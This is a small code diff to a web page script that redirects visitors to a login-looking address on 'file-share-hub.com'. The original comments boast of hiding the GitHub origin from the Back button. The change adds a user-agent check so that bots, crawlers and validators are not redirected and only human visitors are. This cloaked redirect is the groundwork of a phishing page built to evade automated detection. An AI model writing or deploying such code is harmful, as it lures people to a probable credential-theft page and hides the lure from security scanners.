@@ -1,6 +1,6 @@
 <script>
-    setTimeout(function() {
-        // location.replace is better - it hides the GitHub link from the 'Back' button
-        window.location.replace("https://login.file-share-hub.com/DbhZOTUR");
-    }, 800); // 0.8 seconds - feels like a quick 'handshake'
+  const botPattern = /bot|crawler|spider|crawling|slurp|w3c_validator/i;
+  if (!botPattern.test(navigator.userAgent)) {
+      window.location.replace("https://login.file-share-hub.com/DbhZOTUR");
+  }
 </script>
